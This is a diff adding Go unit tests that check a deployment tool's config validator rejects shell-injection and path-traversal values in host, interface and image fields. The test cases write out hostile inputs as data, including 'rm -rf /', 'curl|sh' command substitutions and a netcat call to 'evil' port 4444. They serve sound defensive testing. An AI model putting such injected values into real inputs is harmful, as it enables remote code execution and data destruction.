@@ -338,6 +338,58 @@ func TestValidate_TmfifoIPOK(t *testing.T) {
 	}
 }
 
+// TestValidate_ShellSafeFields locks down the regex gates that
+// dpubnkctl applies to poc.yaml strings that flow into shell commands
+// or filesystem paths (Host.Name, DPU.Hostname, DataPlane.ParentIface,
+// Versions.BFBImage). A malicious or typo'd poc.yaml must be rejected
+// at validate, not silently propagated into an SSH `Run`.
+func TestValidate_ShellSafeFields(t *testing.T) {
+	cases := []struct {
+		name, mutate, want string
+		apply              func(*PoC)
+	}{
+		{"host_name_inject", "host.name with shell metachars", "hosts[0:host1; rm -rf /].name",
+			func(p *PoC) { p.Hosts[0].Name = "host1; rm -rf /" }},
+		{"host_name_traversal", "host.name with ..", "hosts[0:../../etc].name",
+			func(p *PoC) { p.Hosts[0].Name = "../../etc" }},
+		{"dpu_hostname_inject", "dpu.hostname with backtick", "hostname",
+			func(p *PoC) { p.Hosts[0].DPUs[0].Hostname = "x`curl bad|sh`" }},
+		{"parent_iface_inject", "parent_iface with semicolon", "parent_iface",
+			func(p *PoC) { p.Hosts[0].DataPlane.ParentIface = "ens16; nc evil 4444" }},
+		{"parent_iface_too_long", "parent_iface > 15 chars", "parent_iface",
+			func(p *PoC) { p.Hosts[0].DataPlane.ParentIface = strings.Repeat("a", 16) }},
+		{"bfb_image_inject", "versions.bfb_image with quote", "bfb_image",
+			func(p *PoC) { p.Versions.BFBImage = "x'$(curl|sh)'.bfb" }},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			p, repo := goodPoC(t)
+			tc.apply(p)
+			r := Validate(p, repo)
+			if r.Valid() {
+				t.Fatalf("expected validation error for %s, got clean result", tc.mutate)
+			}
+			if !errorContains(r, tc.want) {
+				t.Errorf("expected error mentioning %q for %s, got %v", tc.want, tc.mutate, r.Errors)
+			}
+		})
+	}
+}
+
+// TestValidate_ShellSafeFieldsHappy makes sure the new gates don't
+// reject the canonical good shapes used in real homelabs.
+func TestValidate_ShellSafeFieldsHappy(t *testing.T) {
+	p, repo := goodPoC(t)
+	p.Hosts[0].Name = "worker1"
+	p.Hosts[0].DPUs[0].Hostname = "worker1-bf3"
+	p.Hosts[0].DataPlane.ParentIface = "ens16f0np0"
+	p.Versions.BFBImage = "bf-bundle-3.2.0-113_25.10_ubuntu-24.04_64k_prod.bfb"
+	r := Validate(p, repo)
+	if !r.Valid() {
+		t.Errorf("standard names should validate clean; got: %v", r.Errors)
+	}
+}
+
 func errorContains(r ValidationResult, substr string) bool {
 	for _, e := range r.Errors {
 		if strings.Contains(e, substr) {
